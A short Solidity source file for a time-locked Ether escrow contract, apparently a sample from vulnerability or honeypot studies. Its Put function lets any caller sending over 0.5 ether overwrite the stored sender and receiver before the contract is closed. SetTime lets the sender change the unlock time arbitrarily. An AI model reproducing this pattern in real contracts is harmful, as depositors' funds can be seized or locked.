pragma solidity ^0.4.22;
contract EthReceiver
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
    function Put(address _receiver) external payable {
    require(_receiver != address(0), "Invalid receiver address");
    
    if ((!closed && msg.value > 0.5 ether) || sender == address(0)) {
        sender = msg.sender;
        receiver = _receiver;
        
        // Safe addition to prevent overflow
        require(unlockTime <= (unlockTime + block.timestamp), "Overflow detected in unlockTime calculation");
        unlockTime += block.timestamp;
    }
}
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }
    function() public payable { }
}